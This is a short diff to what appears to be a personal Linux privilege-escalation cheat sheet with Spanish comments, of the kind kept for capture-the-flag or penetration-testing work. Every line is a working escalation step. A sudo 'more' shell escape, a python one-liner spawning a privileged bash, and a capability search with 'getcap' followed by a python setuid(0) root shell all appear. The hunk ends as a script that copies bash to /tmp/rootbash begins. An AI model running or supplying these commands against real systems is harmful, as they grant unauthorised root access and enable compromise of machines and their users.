@@ -31,6 +31,10 @@ TERM=sudo more /etc/profile --> !sh
 # python privesc
 python -c 'import os; os.system("/bin/bash -p")'
 
+# capabilities
+getcap -r / 2>/dev/null
+/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
 # script para escalar privilegios en bash
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
